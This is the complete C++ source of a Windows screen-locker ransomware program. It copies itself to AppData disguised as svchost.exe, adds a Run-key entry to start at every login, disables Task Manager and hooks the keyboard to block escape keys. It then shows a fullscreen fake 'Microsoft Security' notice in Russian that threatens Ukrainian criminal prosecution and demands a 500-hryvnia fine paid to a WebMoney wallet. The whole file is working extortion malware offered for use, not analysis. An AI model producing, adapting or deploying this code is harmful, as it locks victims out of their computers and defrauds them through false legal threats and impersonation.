// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>

#pragma execution_character_set("utf-8")

// Пароль для разблокировки (сейчас это "1234")
static const std::wstring kPassword = L"1234";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;

struct Button {
    int x, y, w, h;
    std::wstring text;
};

static std::vector<Button> g_buttons;
static int g_wx, g_wy;
static const int WIN_W = 1000;
static const int WIN_H = 700;

static void InitButtons() {
    g_buttons.clear();
    int btnW = 28, btnH = 24;
    int startX = g_wx + 30;
    int startY = g_wy + WIN_H - 90;

    // Цифры от 0 до 9
    for (int i = 0; i <= 9; ++i) {
        g_buttons.push_back({startX + i * (btnW + 4), startY, btnW, btnH, std::to_wstring(i)});
    }
    // Кнопка Backspace
    g_buttons.push_back({startX + 10 * (btnW + 4), startY, btnW + 10, btnH, L"<-"});
    
    // Кнопка "разблокировать" справа
    g_buttons.push_back({g_wx + 820, startY, 140, btnH, L"разблокировать"});
}

static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        g_wx = (sw - WIN_W) / 2;
        g_wy = (sh - WIN_H) / 2;
        
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(TRUE); // Показываем курсор для кликов
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);
        InitButtons();
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        
        // 1. Фон рабочего стола (небо и трава)
        HBRUSH sky = CreateSolidBrush(RGB(80, 150, 250));
        FillRect(dc, &rc, sky);
        DeleteObject(sky);
        HBRUSH grass = CreateSolidBrush(RGB(110, 190, 70));
        RECT rcGrass = {0, rc.bottom * 3 / 4, rc.right, rc.bottom};
        FillRect(dc, &rcGrass, grass);
        DeleteObject(grass);

        // 2. Синяя рамка окна
        RECT rcWin = {g_wx, g_wy, g_wx + WIN_W, g_wy + WIN_H};
        HBRUSH winBg = CreateSolidBrush(RGB(0, 100, 200));
        FillRect(dc, &rcWin, winBg);
        DeleteObject(winBg);

        // 3. Верхняя темно-синяя плашка
        RECT rcTitleBar = {g_wx, g_wy, g_wx + WIN_W, g_wy + 40};
        HBRUSH titleBg = CreateSolidBrush(RGB(0, 60, 150));
        FillRect(dc, &rcTitleBar, titleBg);
        DeleteObject(titleBg);

        SetTextColor(dc, RGB(255, 255, 255));
        SetBkMode(dc, TRANSPARENT);
        HFONT fTitle = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fTitle);
        DrawTextW(dc, L"Windows заблокирован!", -1, &rcTitleBar, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // 4. Основная синяя область
        RECT rcContent = {g_wx, g_wy + 40, g_wx + WIN_W, g_wy + WIN_H - 60};
        HBRUSH contentBg = CreateSolidBrush(RGB(0, 80, 160));
        FillRect(dc, &rcContent, contentBg);
        DeleteObject(contentBg);

        // 5. Подзаголовок
        HFONT fSub = CreateFontW(15, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fSub);
        RECT rcSub = rcContent; rcSub.top += 10; rcSub.bottom = rcSub.top + 40;
        DrawTextW(dc, L"Microsoft Security обнаружил ПИРАТСКУЮ ВЕРСИЮ WINDOWS. Статья 176 УК Украины.\nЛишение свободы до 3-ех лет. штраф в размере 9500 гривен.", -1, &rcSub, DT_CENTER | DT_TOP | DT_WORDBREAK);

        // 6. Основной текст (с переносами)
        HFONT fText = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fText);
        RECT rcText = rcContent; rcText.left += 20; rcText.right -= 20; rcText.top += 60;
        
        const wchar_t* mainText = 
            L"Для разблокировки Windows необходимо в течении 12-ти часов оплатить ШТРАФ в размере 500 гривен.\n"
            L"В случае неуплаты штрафа в течении 12-ти часов, сумма штрафа составит 9500 гривен, а в случае отказа\n"
            L"оплаты штрафа, Вы будете привлечены к Уголовной Ответственности по статье 176 УК Украины(см. ниже)\n"
            L"Так же в случае неуплаты все Ваши данные включая: IP адрес, домашний адрес, ФИО будут переданы\n"
            L"в местное отделение полиции\n\n"
            L"Инструкция по оплате штрафа:\n"
            L"1. Найдите ближайший терминал для оплаты мобильной связи. Например iBox.\n"
            L"2. Выберите вкладку \"Оплата услуг\" (может отличаться в зависимости от терминала).\n"
            L"3. Выберите \"Банки, страхование, Эл. коммерция\" (может отличаться в зависимости от терминала).\n"
            L"4. Выберите \"WebMoney\".\n"
            L"5. Введите номер кошелька: U349966071813\n"
            L"6. Внесите в купюроприёмник сумму 500 гривен и совершите оплату.\n"
            L"После оплаты на валаной терминалом квитанции Вы найдете код для ВХОДА в систему. Введите его в\n"
            L"поле ниже и нажмите на \"разблокировать\". После чего данное сообщение полностью пропадет и ваш\n"
            L"компьютер будет разблокирован. Так же все штрафные санкции с Вас будут сняты.";
            
        DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);

        // 7. Поле ввода
        int startY = g_wy + WIN_H - 90;
        RECT rcInput = {g_wx + 640, startY, g_wx + 800, startY + 24};
        HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcInput, whiteBrush);
        DeleteObject(whiteBrush);
        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(GRAY_BRUSH));

        // Текст "Ваш код"
        RECT rcPrompt = rcInput; rcPrompt.right = rcInput.left - 10; rcPrompt.left = rcPrompt.right - 100;
        DrawTextW(dc, L"Ваш код", -1, &rcPrompt, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);

        // 8. Кнопки клавиатуры
        SelectObject(dc, fSub);
        for (const auto& btn : g_buttons) {
            RECT rcBtn = {btn.x, btn.y, btn.x + btn.w, btn.y + btn.h};
            HBRUSH b = CreateSolidBrush(RGB(240, 240, 240));
            FillRect(dc, &rcBtn, b);
            DeleteObject(b);
            FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(GRAY_BRUSH));
            
            SetTextColor(dc, RGB(0, 0, 0));
            DrawTextW(dc, btn.text.c_str(), -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }

        // Введенный текст в поле
        SetTextColor(dc, RGB(0, 0, 0));
        DrawTextW(dc, g_input.c_str(), -1, &rcInput, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        SetTextColor(dc, RGB(255, 255, 255));

        // 9. Нижняя плашка (Статья)
        RECT rcBottom = {g_wx, g_wy + WIN_H - 60, g_wx + WIN_W, g_wy + WIN_H};
        HBRUSH botBg = CreateSolidBrush(RGB(0, 60, 150));
        FillRect(dc, &rcBottom, botBg);
        DeleteObject(botBg);
        
        RECT rcBotText = rcBottom; rcBotText.left += 20; rcBotText.top += 10;
        DrawTextW(dc, L"Ст. 176 УК Украины. Незаконное использование или распространение программного обеспечения либо другое\nумышленное нарушение авторского права. Лишение свободы сроком от 3-ех лет.", -1, &rcBotText, DT_LEFT | DT_TOP | DT_WORDBREAK);

        // Логотип в углу
        RECT rcLogo = rcBottom; rcLogo.right -= 20; rcLogo.top += 30; rcLogo.bottom -= 5;
        DrawTextW(dc, L"Microsoft Security", -1, &rcLogo, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);

        DeleteObject(fTitle);
        DeleteObject(fSub);
        DeleteObject(fText);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l);
        
        for (const auto& btn : g_buttons) {
            if (x >= btn.x && x <= btn.x + btn.w && y >= btn.y && y <= btn.y + btn.h) {
                if (btn.text == L"<-") {
                    if (!g_input.empty()) g_input.pop_back();
                } else if (btn.text == L"разблокировать") {
                    if (g_input == kPassword) {
                        g_locked = false;
                        HKEY hk;
                        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                            DWORD v = 0;
                            RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                            RegCloseKey(hk);
                        }
                        UnhookWindowsHookEx(g_kbHook);
                        DestroyWindow(h);
                        PostQuitMessage(0);
                    } else {
                        g_input.clear();
                    }
                } else {
                    if (g_input.length() < 10) g_input += btn.text;
                }
                InvalidateRect(h, nullptr, TRUE);
                break;
            }
        }
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) g_input.pop_back();
        else if (w >= '0' && w <= '9' && g_input.length() < 10) g_input.push_back((wchar_t)w);
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
             if (g_input == kPassword) {
                g_locked = false;
                HKEY hk;
                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                    DWORD v = 0;
                    RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                    RegCloseKey(hk);
                }
                UnhookWindowsHookEx(g_kbHook);
                DestroyWindow(h);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
